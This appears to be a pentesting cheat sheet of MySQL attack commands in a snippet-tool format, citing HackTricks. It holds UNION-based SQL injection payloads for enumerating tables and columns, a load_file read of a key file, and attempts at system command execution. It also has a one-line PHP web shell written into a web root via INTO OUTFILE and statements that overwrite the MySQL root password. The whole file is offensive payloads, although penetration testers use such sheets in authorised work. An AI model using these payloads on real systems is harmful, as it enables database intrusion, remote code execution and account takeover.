# refer: https://book.hacktricks.xyz/pentesting/pentesting-mysql#basic-and-interesting-mysql-commands


--- show

show databases;

use #{database};

show tables;

describe #{table_name};

--- select

# desc: Base select
select * from users\G;

# desc: Exact privileges
select grantee, table_schema, privilege_type FROM schema_privileges; 

# desc: File privileges
select user,file_priv from mysql.user where user='root'; 

# desc: Version
select version(); 

# desc: Version
select @@version();

# desc: User
select user();

# desc: Database Name
select database(); 

# desc: Try to execute code
select do_system('id');
\! sh

--- Basic MySQLi

Union Select 1,2,3,4,group_concat(0x7c,#{table_name},0x7C) from information_schema.tables

Union Select 1,2,3,4,column_name from information_schema.columns where table_name="#{table_name}"

--- Read & Write

select load_file('/var/lib/mysql-files/key.txt'); #Read file

select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C:/xampp/htdocs/back.php'

--- Try to change MySQL root password

# Try to change MySQL root password
UPDATE mysql.user SET Password=PASSWORD('#{PWD}') WHERE User='root';
UPDATE mysql.user SET authentication_string=PASSWORD('#{PWD}') WHERE User='root';
FLUSH PRIVILEGES;
quit;
@PWD.desc(New Password)